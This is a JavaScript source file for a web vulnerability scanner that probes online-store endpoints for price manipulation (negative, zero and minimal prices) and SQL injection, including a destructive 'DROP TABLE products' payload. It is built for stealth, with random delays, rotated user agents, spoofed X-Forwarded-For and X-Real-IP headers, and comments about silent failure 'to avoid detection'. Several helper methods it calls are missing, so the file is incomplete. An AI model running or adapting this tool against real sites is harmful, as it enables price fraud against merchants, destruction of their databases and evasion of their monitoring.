const axios = require('axios');
const { URL } = require('url');
const crypto = require('crypto');

class VulnerabilityScanner {
    constructor(config, sessionId) {
        this.config = config;
        this.sessionId = sessionId;
        this.vulnerabilities = [];
        this.foundPaths = [];
        this.parameters = [];
        this.results = {
            vulnerabilities: [],
            exploitable: [],
            priceManipulationVectors: []
        };
    }

    async execute() {
        this.log('Starting vulnerability discovery phase', 'info');
        
        // Phase 1: Target Analysis
        await this.analyzeTarget();
        
        // Phase 2: Parameter Discovery
        await this.discoverParameters();
        
        // Phase 3: Vulnerability Detection
        await this.detectVulnerabilities();
        
        // Phase 4: Price Manipulation Analysis
        await this.analyzePriceManipulationVectors();
        
        this.log('Vulnerability scan completed', 'success');
    }

    async analyzeTarget() {
        try {
            // Stealthy initial request
            const response = await this.makeStealthRequest(this.config.targetUrl);
            
            // Extract potential price endpoints
            const priceEndpoints = this.extractPriceEndpoints(response.data);
            this.foundPaths = priceEndpoints;
            
            // Analyze response headers for backend technology
            this.analyzeHeaders(response.headers);
            
        } catch (error) {
            this.log(`Target analysis failed: ${error.message}`, 'error');
        }
    }

    async discoverParameters() {
        for (const path of this.foundPaths) {
            try {
                const fullUrl = new URL(path, this.config.targetUrl).href;
                const analysis = await this.analyzeEndpointParameters(fullUrl);
                this.parameters.push(...analysis);
            } catch (error) {
                // Silent failure to avoid detection
            }
        }
    }

    async detectVulnerabilities() {
        for (const param of this.parameters) {
            // Test for price manipulation vulnerabilities
            const priceVuln = await this.testPriceManipulation(param);
            if (priceVuln) {
                this.vulnerabilities.push(priceVuln);
                this.addExploitableVulnerability(priceVuln);
            }

            // Test for SQL injection
            const sqlVuln = await this.testSQLInjection(param);
            if (sqlVuln) {
                this.vulnerabilities.push(sqlVuln);
            }

            // Test for parameter tampering
            const tamperingVuln = await this.testParameterTampering(param);
            if (tamperingVuln) {
                this.vulnerabilities.push(tamperingVuln);
            }
        }
    }

    async testPriceManipulation(param) {
        const testCases = [
            { amount: -1, description: 'Negative price' },
            { amount: 0.01, description: 'Minimum price' },
            { amount: 0.00, description: 'Zero price' },
            { amount: 999999, description: 'High price' }
        ];

        for (const testCase of testCases) {
            try {
                const response = await this.makeManipulationRequest(param, testCase.amount);
                
                if (response.status === 200) {
                    // Check if price was accepted without validation
                    const priceAccepted = this.checkPriceAccepted(response.data, testCase.amount);
                    
                    if (priceAccepted) {
                        return {
                            id: this.generateVulnerabilityId(),
                            title: 'Price Manipulation Vulnerability',
                            description: `Price parameter ${param.name} accepts manipulated values`,
                            severity: this.calculateSeverity(param, testCase.amount),
                            endpoint: param.endpoint,
                            method: param.method,
                            parameter: param.name,
                            priceManipulationPotential: true,
                            exploitability: 'exploitable',
                            testValue: testCase.amount,
                            testDescription: testCase.description,
                            confidence: this.calculateConfidence(response),
                            timestamp: Date.now()
                        };
                    }
                }
            } catch (error) {
                // Continue testing other cases
            }
        }
        return null;
    }

    async testSQLInjection(param) {
        const payloads = [
            "' OR '1'='1",
            "'; DROP TABLE products--",
            "' UNION SELECT price FROM products--"
        ];

        for (const payload of payloads) {
            try {
                const response = await this.makeStealthRequest(param.endpoint, {
                    [param.name]: payload
                });

                if (this.detectSQLInjectionResponse(response)) {
                    return {
                        id: this.generateVulnerabilityId(),
                        title: 'SQL Injection',
                        description: `Parameter ${param.name} vulnerable to SQL injection`,
                        severity: 'high',
                        endpoint: param.endpoint,
                        method: param.method,
                        parameter: param.name,
                        priceManipulationPotential: false,
                        exploitability: 'high',
                        payload: payload,
                        timestamp: Date.now()
                    };
                }
            } catch (error) {
                // Continue testing
            }
        }
        return null;
    }

    async makeStealthRequest(url, data = {}) {
        const delay = Math.random() * 2000 + 500; // Random delay
        
        await new Promise(resolve => setTimeout(resolve, delay));

        const headers = this.generateStealthHeaders();
        
        return await axios({
            url: url,
            method: 'GET',
            headers: headers,
            timeout: 10000,
            validateStatus: () => true, // Accept all status codes
            params: data
        });
    }

    async makeManipulationRequest(param, priceValue) {
        const headers = this.generateStealthHeaders();
        
        const data = { ...param.originalData };
        data[param.name] = priceValue;

        return await axios({
            url: param.endpoint,
            method: param.method,
            headers: headers,
            timeout: 10000,
            validateStatus: () => true,
            [param.method === 'GET' ? 'params' : 'data']: data
        });
    }

    generateStealthHeaders() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ];

        return {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': this.generateRandomIP(),
            'X-Real-IP': this.generateRandomIP()
        };
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    calculateSeverity(param, manipulatedValue) {
        if (manipulatedValue <= 0) return 'critical';
        if (manipulatedValue < param.originalValue * 0.5) return 'high';
        return 'medium';
    }

    generateVulnerabilityId() {
        return crypto.randomBytes(8).toString('hex');
    }

    log(message, level = 'info') {
        console.log(`[${new Date().toISOString()}] [${level.toUpperCase()}] [${this.sessionId}] ${message}`);
    }
}

module.exports = VulnerabilityScanner;


